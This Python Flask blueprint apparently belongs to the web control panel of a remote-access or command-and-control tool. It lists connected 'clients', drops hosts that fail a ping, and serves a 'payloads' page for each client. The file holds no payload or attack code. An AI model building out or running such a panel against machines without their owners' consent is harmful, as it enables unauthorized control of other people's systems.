import flask
import threading
import common


view_routes = flask.Blueprint('views', __name__)


@view_routes.route('/')
@view_routes.route('/clients')
def clients():
	for host in common.hosts:
		try:
			common.send_msg(host[1], "ping".encode())
		except Exception as e:
			with common.lock:
				common.hosts.remove(host)
				print(e)

	return flask.render_template('index.html', hosts=common.hosts)


@view_routes.route('/payloads/<client>')
def payloads(client):
	return flask.render_template('payloads.html', client=client)
